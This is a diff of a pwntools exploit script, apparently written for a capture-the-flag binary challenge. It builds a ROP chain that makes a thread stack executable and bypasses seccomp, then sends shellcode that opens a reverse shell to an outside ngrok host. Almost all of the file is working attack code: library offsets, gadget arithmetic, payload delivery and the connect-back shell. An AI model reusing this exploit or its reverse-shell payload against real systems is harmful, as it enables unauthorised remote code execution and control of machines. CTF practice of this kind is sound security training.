@@ -7,43 +7,67 @@ libp = ELF('./libpthread-2.31.so')
 libc = ELF('./libcs-2.31.so')
 ld = ELF('./ld-2.31.so')
 
+context.binary = e
+
 p = process(e.path)
 #p = remote()
 
 #funcs
 
-def idx(x):
-    return x // 0x8
+def add(x, y, t = True):
+    if t:
+        p.sendlineafter('(y/N)', 'y')
+    p.sendlineafter('to:', str(x))
+    p.sendlineafter('add:', str(y))
 
 #vars
 
-libp_off = 0x4920
-mutexlock_off = libp.sym['pthread_mutex_lock']
+libp_off = 0x3a230
+strtthread_off = libp.sym['start_thread']
+stkexec_off = libp.sym['__make_stacks_executable']
 
-libc_off = 0x27920
-iostdout_off = libc.sym['_IO_2_1_stdout_']
-onegadget_off = 0xe6aee
+libc_off = 0x5d230
+strt_off = libc.sym['__libc_start_main']
+nlglolo_off = libc.sym['_nl_global_locale']
+nlupper_off = libc.sym['_nl_C_LC_CTYPE_toupper']
+pthreadexit_off = libc.sym['pthread_exit']
 
-ld_off = 0x21b920
-rtld_off = ld.sym['_rtld_global']
+shellcode = shellcraft.connect('2.tcp.ngrok.io', 15282)
+shellcode += shellcraft.dupsh()
+shellcode += shellcraft.exit(0)
 
-log.info('Libp stk off: ' + hex(libp_off))
-log.info('Mutexlock libp off: ' + hex(mutexlock_off))
+log.info('Libp off: ' + hex(libp_off))
+log.info('Start thread libp off: ' + hex(strtthread_off))
+log.info('Stack exec libp off: ' + hex(stkexec_off))
 print("")
-log.info('Libc stk off: ' + hex(libc_off))
-log.info('iostdout libc off: ' + hex(iostdout_off))
-log.info('One gadget libc off: ' + hex(onegadget_off))
+log.info("Libc off: " + hex(libc_off))
+log.info('Start libc off: ' + hex(strt_off))
+log.info('Nlglolo libc off: ' + hex(nlglolo_off))
+log.info('Nlupper libc off: ' + hex(nlupper_off))
+log.info('Pthreadexit libc off: ' + hex(pthreadexit_off))
 print("")
-log.info('Ld stk off: ' + hex(ld_off))
-log.info('rtld ld off: ' + hex(rtld_off))
+log.info('Shellcode len: ' + hex(len(asm(shellcode))))
 
 #exploit
 
-#send size so always pass check
+#thread stack is at fixed offset to libc, change return address to thread stack
 
-p.sendlineafter('?', str(0xff))
-gdb.attach(p.pid + 1)
-p.sendline('3')
+add(19, 0x10 * 8 - (libc_off + strt_off + 243), False)
+
+#create rop feng shui chain to call __make_stacks_executable then return pthread_exit
+
+rop = ROP(libc)
+
+add(37, (libc_off + rop.rdi.address) - (libp_off + strtthread_off + 217))
+add(39, 0x5c900 + rop.rsp.address)
+add(40, -0x90)
+add(280, pthreadexit_off - (nlupper_off + 512))
+add(276, (libp_off + stkexec_off + 32) - (libc_off + nlglolo_off)) #idk why this one has to be last
+
+#add shell code while also calling rop chain which eventually runs shellcode without seccomp
+#use this to connect to shell with ngrok
+
+p.sendlineafter('(y/N)', asm(shellcode))
 
 #pray for flag
 
